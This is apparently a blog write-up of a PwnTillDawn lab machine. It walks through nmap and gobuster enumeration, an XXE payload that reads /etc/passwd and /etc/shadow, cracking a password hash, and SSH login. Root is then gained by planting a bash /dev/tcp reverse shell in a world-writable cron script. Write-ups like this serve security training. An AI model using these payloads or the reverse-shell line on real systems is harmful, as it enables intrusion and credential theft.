![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/406bef52-c8ba-4f03-8c11-f78603f09605)

first enumeration with nmap 

```
# Nmap 7.93 scan initiated Fri Jun 16 04:36:53 2023 as: nmap -sC -sV -oN normal.txt -p 22,2623,8089 -Pn 10.150.150.226
Nmap scan report for 10.150.150.226
Host is up (0.18s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 31484661d84e090ee050c35bb0f36b5e (RSA)
|   256 12bb91dab9ad18dd440b3b6cd63a9783 (ECDSA)
|_  256 1408ae353dba8c46e9f7cd49c9edb31e (ED25519)
2623/tcp open  http     Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1
|_http-title: 404 Not Found
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:41:05
|_Not valid after:  2022-10-24T09:41:05
|_http-server-header: Splunkd
|_http-title: splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 16 04:37:40 2023 -- 1 IP address (1 host up) scanned in 47.08 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/77981ccb-0250-490b-9c12-514974a2411c)

noticed a web server running on port `2623`, opening it on a browser got a 404 rsponse... let's fuzz

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.226]
└─$ gobuster dir -u http://10.150.150.226:2623/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k -b 403,404 -x php,txt 2>/dev/null
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.150.150.226:2623/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/06/17 00:25:02 Starting gobuster in directory enumeration mode
===============================================================
/xml                  (Status: 200) [Size: 915]
/doc                  (Status: 200) [Size: 456]
/lookup               (Status: 200) [Size: 172]
/cookie               (Status: 200) [Size: 111]
/console              (Status: 200) [Size: 1985]
/evaluate             (Status: 200) [Size: 111
[***]
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/41a9c01e-0992-4145-b8af-eaf3c64a7bf1)

navigating to the `/xml` dir we can see it's talking about xml parsing inputs. lt's check the source page.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b08c9a88-86b4-4ee9-b4d6-9c00348719c6)

checking th source page, we can see an `XXE` payload. let's intercept request with burp and see what we have.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/42f6337e-667e-49ac-bc71-daf40aceaffd)

intercepting request with burp and using payload 
```<!DOCTYPE+foo+[+++++<!ELEMENT+foo+ANY+>+++<!ENTITY+xxe+SYSTEM+"file%3a///etc/passwd"+>]><foo>%26xxe%3b</foo>```
we read the `/etc/passwd` file. let's try read the `/etc/shadow` file.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/28ea6a91-b038-4c4e-99d3-6aadd7064d41)

Bankai!!! we could read the `/etc/shadow` file.  we can see the password hashes of the users available. copied the password hash for user `monsieurcandle-server`.

```
MonsieurCandie:$6$LGidv.6A$9txwQnhm9MBCW7bgZ9Lz/syEeH5h6CFrEZc3wb/FZCUOg1SUXysjLYrFu0NmFmKzV2CvyRfGkD3LBPe1caWOV1:17841:0:99999:7:::
```
let's crack the hash using john.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.226]
└─$ john --show hash.txt
MonsieurCandie:sunshine:17841:0:99999:7:::

1 password hash cracked, 0 left
```
password cracked to `sunshine`. let's login ssh using this creds.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c0769d62-b15d-4306-9bd8-3a6258395368)

bingo we are in.



## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d3cec133-ec5f-46e7-9d9f-67490c99f70e)

running pspy, we can see a cronjob file `SrvMantainance.sh` in running as root in `/tmp` dir. let's check it out.

```
MonsieurCandie@MonsieurCandie-Server:/tmp$ ls -al SrvMantainance.sh 
-rwxrwxrwx 1 root root 89 Apr 28  2020 SrvMantainance.sh
MonsieurCandie@MonsieurCandie-Server:/tmp$ nano SrvMantainance.sh
MonsieurCandie@MonsieurCandie-Server:/tmp$ cat SrvMantainance.sh 
#!/bin/bash
# This script is meant for maintanance only and will be executed regularly by the system

/bin/bash -c "/bin/bash -i >& /dev/tcp/10.66.66.10/1337 0>&1"
MonsieurCandie@MonsieurCandie-Server:/tmp$
```
checking the file perm, we have write,read,execute access to the file, so modified the file and put a reverse shell payload in it, fire ncat listener and wait for a min.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.226]
└─$ ncat -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.150.150.226.
Ncat: Connection from 10.150.150.226:42190.
bash: cannot set terminal process group (5491): Inappropriate ioctl for device
bash: no job control in this shell
root@MonsieurCandie-Server:/tmp# cd
cd
root@MonsieurCandie-Server:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@MonsieurCandie-Server:~# 
```
Bankai!!! we got reverse shell as root.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e506b26c-14c3-4435-af4d-e6efa1e816c7)

and we are through 🤓 easy box yeah 😉

